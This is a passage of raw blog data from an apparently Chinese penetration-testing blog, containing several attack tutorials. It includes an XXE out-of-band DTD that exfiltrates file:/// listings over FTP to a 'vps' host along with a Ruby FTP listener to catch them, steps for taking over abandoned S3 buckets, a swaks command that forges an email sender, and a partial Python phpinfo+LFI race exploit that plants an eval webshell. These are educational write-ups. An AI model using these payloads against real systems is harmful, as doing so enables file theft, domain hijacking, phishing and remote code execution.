class=\"string\">&quot;128px&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;128px&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">xmlns:xlink</span>=<span class=\"string\">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.1&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">font-size</span>=<span class=\"string\">&quot;16&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;16&quot;</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"6-利用ftp协议列目录\"><a href=\"#6-利用ftp协议列目录\" class=\"headerlink\" title=\"6. 利用ftp协议列目录\"></a>6. 利用ftp协议列目录</h2><p>使用ruby编写ftp服务端</p>\n<figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;socket&#x27;</span></span><br><span class=\"line\">server = TCPServer.new <span class=\"number\">3333</span></span><br><span class=\"line\">loop <span class=\"keyword\">do</span></span><br><span class=\"line\">  Thread.start(server.accept) <span class=\"keyword\">do</span> <span class=\"params\">|client|</span></span><br><span class=\"line\">    puts <span class=\"string\">&quot;New client connected&quot;</span></span><br><span class=\"line\">    data = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    client.puts(<span class=\"string\">&quot;220 xxe-ftp-server&quot;</span>)</span><br><span class=\"line\">    loop &#123;</span><br><span class=\"line\">        req = client.gets()</span><br><span class=\"line\">        puts <span class=\"string\">&quot;&lt; &quot;</span>+req</span><br><span class=\"line\">        <span class=\"keyword\">if</span> req.<span class=\"keyword\">include</span>? <span class=\"string\">&quot;USER&quot;</span></span><br><span class=\"line\">            client.puts(<span class=\"string\">&quot;331 password please - version check&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">           <span class=\"comment\">#puts &quot;&gt; 230 more data please!&quot;</span></span><br><span class=\"line\">            client.puts(<span class=\"string\">&quot;230 more data please!&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">end</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n\n<p>然后在dtd文件中，使用ftp进行登录，在ftp密码字段插入目录，能够通过ftp换行输出所有目录</p>\n<p>dtd文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;ftp:&#x2F;&#x2F;test:%file;@vps:3333&#39;&gt;&quot;&gt;</span><br><span class=\"line\">%eval;</span><br><span class=\"line\">%exfiltrate;</span><br></pre></td></tr></table></figure>\n\n<p>在burp中加载攻击的dtd文件</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [<span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span></span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\"><span class=\"meta-string\">&quot;http://vps/test.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2021/03/09/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310161841633.png\" alt=\"image-20210310161841633\"></p>\n<h2 id=\"7-jar协议\"><a href=\"#7-jar协议\" class=\"headerlink\" title=\"7. jar协议\"></a>7. jar协议</h2><h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ol>\n<li><a href=\"https://portswigger.net/web-security/xxe\">XML external entity (XXE) injection</a></li>\n<li><a href=\"https://portswigger.net/web-security/xxe/blind\">Finding and exploiting blind XXE vulnerabilities</a></li>\n<li><a href=\"https://xz.aliyun.com/t/3357\">一篇文章带你深入理解漏洞之 XXE 漏洞</a></li>\n<li><a href=\"https://xz.aliyun.com/t/4059\">绕过WAF保护的XXE</a></li>\n<li><a href=\"https://hundan.org/2019-11-13-%E4%BD%BF%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB.html\">使用本地DTD文件进行XXE攻击</a></li>\n</ol>\n","categories":["Pentest"],"tags":["xxe"]},{"title":"amazon S3 Bucket takeover","url":"http://blog.le31ei.top/2021/03/04/amazon-S3-Bucket-takeover/","content":"<h1 id=\"0x01-原理\"><a href=\"#0x01-原理\" class=\"headerlink\" title=\"0x01 原理\"></a>0x01 原理</h1><p>亚马逊S3对象存储，可以存放文件、图形等资源。通过api进行读写操作。近几年的网站开发存储资源文件如头像、上传文件等都基本开始采用对象存储的方式进行。</p>\n<p>阿里云的对象存储对应简称为OSS，腾讯云的对象存储为COS。在使用对象存储时，首先会创建一个存储桶（bucket），在对应的存储桶中可以上传文件、创建文件夹等操作。同时还具备对应的权限管理。一般在开发过程中，创建好存储桶后，使用api接口对存储桶进行相关的操作。</p>\n<p>生成新的存储桶时，系统会默认创建一个域名，类似于<code>http://bscw-web-admin-prod.s3-website.us-east-2.amazonaws.com</code>和<code>https://coding-pages-bucket.cos-website.ap-hongkong.myqcloud.com</code>，域名规则为子域为桶名称，然后加上对象存储的简称，然后加上地域的名字。例如，<code>coding-pages-bucket</code>是桶的名称，<code>cos-website</code>是对象存储的名称，<code>ap-hongkong</code>为对象存储所在的区域。</p>\n<p>一般情况下，会配置一个CNAME的域名映射，将自己的域名映射到存储桶默认分配的域名，这样存储桶就能通过静态页面对资源进行展示了。</p>\n<p>根据以上原理描述，可以对对象存储进行劫持，原理可以按照如下理解</p>\n<blockquote>\n<ol>\n<li>在存储桶不再使用后，一般厂家会删除对应的存储桶，因为云存储是要收费的，但是域名对应存储桶域名的映射一般不会删除</li>\n<li>所以在访问域名时候，会提示404，并且显示<code>NoSuchBucket</code></li>\n<li>这时候域名访问的则是对存储桶映射的域名的访问。劫持时，则是在对应的云存储厂商上面注册一样存储桶，那么则可以劫持对应的域名了。</li>\n<li>注册存储桶一共有两个要点，一是注册同样名字的存储桶，二是注册同一个地域的存储桶，目的就是保持生成的存储桶域名一致</li>\n</ol>\n</blockquote>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210302162047983.png\" alt=\"image-20210302162047983\"></p>\n<h1 id=\"0x02-实战S3劫持\"><a href=\"#0x02-实战S3劫持\" class=\"headerlink\" title=\"0x02 实战S3劫持\"></a>0x02 实战S3劫持</h1><h2 id=\"1-搜索\"><a href=\"#1-搜索\" class=\"headerlink\" title=\"1. 搜索\"></a>1. 搜索</h2><p>可以通过fofa进行搜索，语法是<code>body=&quot;BucketName&quot;</code>，搜索结果404的页面基本为废弃的存储桶。</p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210302164142709.png\" alt=\"image-20210302164142709\"></p>\n<h2 id=\"2-注册存储桶并劫持\"><a href=\"#2-注册存储桶并劫持\" class=\"headerlink\" title=\"2. 注册存储桶并劫持\"></a>2. 注册存储桶并劫持</h2><p>根据搜索结果得到<code>BucketName</code></p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304095504174.png\" alt=\"image-20210304095504174\"></p>\n<p>如果搜索出来的域名不为amazon自动分配的带有区域的域名，则需要通过域名查询CNAME的的映射，需要得到相关的区域。</p>\n<p>创建存储桶时，输入对应的桶名称，选择对应的区域</p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100111218.png\" alt=\"image-20210304100111218\"></p>\n<p>将阻止公开访问的勾去掉，确保能够公开访问</p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100143369.png\" alt=\"image-20210304100143369\"></p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100206795.png\" alt=\"image-20210304100206795\"></p>\n<p>在该存储桶内上传对应的文件，一般传入index.html</p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100302844.png\" alt=\"image-20210304100302844\"></p>\n<p>此时访问对应的域名，已经显示AccessDenied了，证明已经生效了。但是由于访问权限问题，导致在公开访问时，会显示访问拒绝，后面仅需要设置对应的权限即可。</p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100356886.png\" alt=\"image-20210304100356886\"></p>\n<p>在对应文件（index.html）的<code>访问控制列表(ACL)</code>中，将访问权限打开</p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304100911928.png\" alt=\"image-20210304100911928\"></p>\n<p>最后一步，因为是静态网站，需要在存储桶属性里面将静态网站托管的权限打开</p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304101017134.png\" alt=\"image-20210304101017134\"></p>\n<p><img src=\"/2021/03/04/amazon-S3-Bucket-takeover/image-20210304101706843.png\" alt=\"image-20210304101706843\"></p>\n<p>最后即可劫持成功</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ol>\n<li><a href=\"https://blog.securelayer7.net/aws-penetration-testing-for-s3-bucket-service-basics-security/\">https://blog.securelayer7.net/aws-penetration-testing-for-s3-bucket-service-basics-security/</a></li>\n<li><a href=\"https://blog.securelayer7.net/hands-on-aws-s3-bucket-account-takeover-vulnerability/\">https://blog.securelayer7.net/hands-on-aws-s3-bucket-account-takeover-vulnerability/</a></li>\n</ol>\n","categories":["Pentest"],"tags":["takeover"]},{"title":"spf与邮件伪造","url":"http://blog.le31ei.top/2021/02/24/spf与邮件伪造/","content":"<h1 id=\"0x01-SPF\"><a href=\"#0x01-SPF\" class=\"headerlink\" title=\"0x01 SPF\"></a>0x01 SPF</h1><p>SPF，全称为 Sender Policy Framework，即发件人策略框架。目前基本上市面正在使用的邮箱产品均对SPF进行了校验。</p>\n<p><strong>原理：</strong></p>\n<p>SPF是一个DNS的TXT记录，定义了收到的邮件允许发送的ip范围。</p>\n<p>例如使用<code>swaks</code>伪造邮件发送<code>swaks -t test@qq.com -f admin@qq.com</code>。该命令表示从<code>admin@qq.com</code>发送邮件到<code>test@qq.com</code>。qq邮箱在收到邮件后，会对<code>qq.com</code>的SPF记录进行校验，判断发送客户端的ip地址是否在SPF记录所包含的范围内。如图显示SPF校验失败。</p>\n<p><img src=\"/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20210223162316539.png\" alt=\"image-20210223162316539\"></p>\n<p>查询SPF的方法很简单，使用如下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nslookup -type=txt qq.com</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> output</span></span><br><span class=\"line\">Server:        61.139.2.69</span><br><span class=\"line\">Address:    61.139.2.69#53</span><br><span class=\"line\"></span><br><span class=\"line\">Non-authoritative answer:</span><br><span class=\"line\">qq.com    text = &quot;v=spf1 include:spf.mail.qq.com -all&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Authoritative answers can be found from:</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>SPF语法比较简单</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v=spf1 include:spf.mail.qq.com -all</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>v=spf1固定格式，目前spf只有第一版</li>\n<li>include:spf.mail.qq.com表示引入spf.mail.qq.com的SPF记录，继续递归查询spf.mail.qq.com的记录</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜ nslookup -type=txt spf.mail.qq.com</span><br><span class=\"line\">Server:        61.139.2.69</span><br><span class=\"line\">Address:    61.139.2.69#53</span><br><span class=\"line\"></span><br><span class=\"line\">Non-authoritative answer:</span><br><span class=\"line\">spf.mail.qq.com    text = &quot;v=spf1 include:spf-a.mail.qq.com include:spf-b.mail.qq.com include:spf-c.mail.qq.com include:spf-d.mail.qq.com include:spf-e.mail.qq.com include:spf-f.mail.qq.com include:spf-g.mail.qq.com -all&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Authoritative answers can be found from:</span><br><span class=\"line\"></span><br><span class=\"line\">➜  ~ nslookup -type=txt spf-a.mail.qq.com</span><br><span class=\"line\">Server:        61.139.2.69</span><br><span class=\"line\">Address:    61.139.2.69#53</span><br><span class=\"line\"></span><br><span class=\"line\">Non-authoritative answer:</span><br><span class=\"line\">spf-a.mail.qq.com    text = &quot;v=spf1 ip4:203.205.251.0/24 ip4:103.7.29.0/24 ip4:59.36.129.0/24 ip4:113.108.23.0/24 ip4:113.108.11.0/24 ip4:119.147.193.0/24 ip4:119.147.194.0/24 ip4:59.78.209.0/24 ip4:113.96.223.0/24 ip4:183.3.226.0/24 ip4:183.3.255.0/24 ip4:59.36.132.0/24 -all&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Authoritative answers can be found from:</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>-all表示拒绝所有，spf记录从左到右依次执行，允许后，其余所有拒绝</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;+&quot;  Pass（通过）</span><br><span class=\"line\">&quot;-&quot;  Fail（拒绝）</span><br><span class=\"line\">&quot;~&quot;  Soft Fail（软拒绝）邮件将会被放入垃圾箱或做其他标记</span><br><span class=\"line\">&quot;?&quot;  Neutral（中立）</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x02-邮件伪造\"><a href=\"#0x02-邮件伪造\" class=\"headerlink\" title=\"0x02 邮件伪造\"></a>0x02 邮件伪造</h1><p>市面上所有的邮箱平台均对SPF有相关校验，所以邮件伪造的关键点就是对SPF的绕过。</p>\n<p>要绕过SPF除了相关的SPF记录配置错误之外，就只能通过SMTP代发的方式，伪造显示的邮件发件人来进行伪造。</p>\n<p>具体使用如下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">swaks --body &quot;test&quot; --header &quot;Subject:test&quot; --h-From: &#x27;test&lt;admin@qq.com&gt;&#x27; -f admin@le31ei.top -t le31ei@163.com --server smtp.mxhichina.com -au xxx -ap xxx -p 25 --header-X-Mailer 163.com --ehlo 163.com</span><br></pre></td></tr></table></figure>\n\n<p><code>--header-X-Mailer</code>是为了伪造smtp中的X-Mailer参数，默认带有工具的相关参数，<strong>qq邮箱会直接放入垃圾箱</strong></p>\n<p><img src=\"/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20210223165505391.png\" alt=\"image-20210223165505391\"></p>\n<p>以上的方式对于gmail已经无效了，邮件不会显示在收件箱中。但QQ邮箱能正常接收，但是会提示由谁代发</p>\n<p><img src=\"/2021/02/24/spf%E4%B8%8E%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/image-20210223165626191.png\" alt=\"image-20210223165626191\"></p>\n<p>对于163邮箱，默认没有任何防护措施。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ol>\n<li><a href=\"https://bbs.ichunqiu.com/thread-55388-1-1.html\">关于邮件伪造的一些新思路</a></li>\n<li><a href=\"https://www.cnblogs.com/xiaozi/p/12906040.html\">邮件伪造之SPF绕过的5种思路</a></li>\n<li><a href=\"http://www.renfei.org/blog/introduction-to-spf.html\">SPF 记录：原理、语法及配置方法简介</a></li>\n<li><a href=\"https://help.aliyun.com/knowledge_detail/36771.html\">邮箱域名的spf记录添加方法</a></li>\n<li><a href=\"https://www.kitterman.com/spf/validate.html\">SPF Record Testing Tools</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/218889\">邮件伪造组合拳</a></li>\n</ol>\n","categories":["RedTeam"],"tags":["邮件伪造"]},{"title":"php临时文件","url":"http://blog.le31ei.top/2021/02/22/php临时文件/","content":"<p>本来打算研究下phpinfo+本地包含导致命令执行的利用方法，深入研究原理后发现是php临时文件机制的问题，故记录下学习过程。</p>\n<h1 id=\"0x01-phpinfo-LFI\"><a href=\"#0x01-phpinfo-LFI\" class=\"headerlink\" title=\"0x01 phpinfo+LFI\"></a>0x01 phpinfo+LFI</h1><p>该方法的利用原理其实很简单，利用的是php在上传的时候会生成临时文件。会在临时的存储目录生成名为：<code>php**.tmp</code>的临时文件，而该文件内容就是上传的内容，并且该文件路径会显示在phpinfo的tmp_dir路径当中。</p>\n<p>在存在本地包含漏洞的时候，可以直接通过读取phpinfo中的该配置项，直接去包含临时文件，执行临时文件中的代码。</p>\n<p>如果临时文件是一个写文件的脚本，那么直接就可以通过竞争条件的方式在临时文件被删除之前，生成新的shell文件。</p>\n<p>具体利用代码如下：</p>\n<p>在使用时，需要修改包含文件的路径，写文件的位置，等参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PAYLOAD=<span class=\"string\">&quot;&quot;&quot;&lt;?php file_put_contents(&#x27;/tmp/eval&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\\r&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">UPLOAD=<span class=\"string\">&quot;&quot;&quot;-----------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: text/plain\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">&#123;&#125;</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(PAYLOAD)</span><br><span class=\"line\"></span><br><span class=\"line\">padding=<span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">5000</span></span><br><span class=\"line\"></span><br><span class=\"line\">INFOREQ=<span class=\"string\">&quot;&quot;&quot;POST /phpinfo.php?a=&#123;padding&#125; HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&#123;padding&#125;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT: &#123;padding&#125;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_USER_AGENT: &#123;padding&#125;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT_LANGUAGE: &#123;padding&#125;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PRAGMA: &#123;padding&#125;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: &#123;len&#125;\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">&#123;upload&#125;&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(padding=padding, <span class=\"built_in\">len</span>=<span class=\"built_in\">len</span>(UPLOAD), upload=UPLOAD)</span><br><span class=\"line\"></span><br><span class=\"line\">LFIREQ=<span class=\"string\">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/4.0\\r</span></span><br><span class=\"line\"><span class=\"string\">Proxy-Connection: Keep-Alive\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PHPINFO_LFI</span>():</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, host, port</span>):</span></span><br><span class=\"line\">        self.host = host</span><br><span class=\"line\">        self.port = <span class=\"built_in\">int</span>(port)</span><br><span class=\"line\">        self.req_payload= (INFOREQ % self.host).encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        self.lfireq = LFIREQ</span><br><span class=\"line\">        self.offset = self.get_offfset()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_offfset</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        获取tmp名字的offset</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        s.connect((self.host, self.port))</span><br><span class=\"line\"></span><br><span class=\"line\">        s.send(self.req_payload)</span><br><span class=\"line\">        page = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            i = s.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">            page+=i        </span><br><span class=\"line\">            <span class=\"keyword\">if</span> i == <span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> i.decode(<span class=\"string\">&#x27;utf8&#x27;</span>).endswith(<span class=\"string\">&quot;0\\r\\n\\r\\n&quot;</span>):</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        s.close()</span><br><span class=\"line\"></span><br><span class=\"line\">        pos = page.decode(<span class=\"string\">&#x27;utf8&#x27;</span>).find(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;get the offset :&#123;&#125; &#x27;</span>.<span class=\"built_in\">format</span>(pos))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> pos == <span class=\"number\">-1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">return</span> pos+<span class=\"number\">256</span> <span class=\"comment\">#多加一些字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">phpinfo_lfi</span>(<span class=\"params\">self</span>):</span> </span><br><span class=\"line\">        <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        同时发送phpinfo请求与lfi请求</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">        phpinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">        lfi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class=\"line\"></span><br><span class=\"line\">        phpinfo.connect((self.host, self.port))</span><br><span class=\"line\">        lfi.connect((self.host, self.port))</span><br><span class=\"line\"></span><br><span class=\"line\">        